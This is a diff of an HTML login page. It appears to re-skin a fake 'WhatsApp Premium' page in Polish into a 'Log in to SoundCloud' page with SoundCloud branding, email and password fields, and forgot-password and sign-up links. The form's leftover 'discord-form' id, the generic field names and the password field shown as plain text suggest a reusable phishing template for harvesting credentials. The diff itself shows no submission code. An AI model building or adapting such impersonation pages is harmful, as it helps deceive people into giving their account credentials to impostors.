@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WhatsApp Premium</title>
+  <title>Log in to SoundCloud</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
@@ -12,26 +12,31 @@
 </head>
 <body>
   <main class="page-shell">
-    <section class="form-panel" aria-labelledby="page-title">
-      <div class="whatsapp-header">
-        <div class="whatsapp-mark" aria-label="WhatsApp">WA</div>
-        <div>
-          <h1 id="page-title">Logowanie</h1>
-        </div>
+    <section class="form-panel" id="message" aria-labelledby="page-title">
+      <div class="login-brand" aria-label="SoundCloud">
+        <div class="soundcloud-mark">SC</div>
+        <span>SoundCloud</span>
       </div>
-      <div class="chat-preview" aria-hidden="true">
-      </div>
+      <h1 id="page-title">Log in to SoundCloud</h1>
+      <p class="login-subtitle">Welcome back. Enter your details below.</p>
 
       <form id="discord-form">
+        <label for="first-text">Email address</label>
         <input id="first-text" name="firstText" type="text" placeholder="email" maxlength="200" required>
 
+        <label for="second-text">Password</label>
         <input id="second-text" name="secondText" type="text" placeholder="hasło" maxlength="200" required>
 
+        <a class="forgot-link" href="#forgot">Forgot your password?</a>
+
         <button type="submit" id="submit-button">
-          <span>Zaloguj</span>
+          <span>Log in</span>
         </button>
         <p id="form-status" class="form-status" role="status" aria-live="polite"></p>
       </form>
+
+      <div class="divider"><span>or</span></div>
+      <a class="signup-link" href="#signup">Create an account</a>
     </section>
   </main>
 
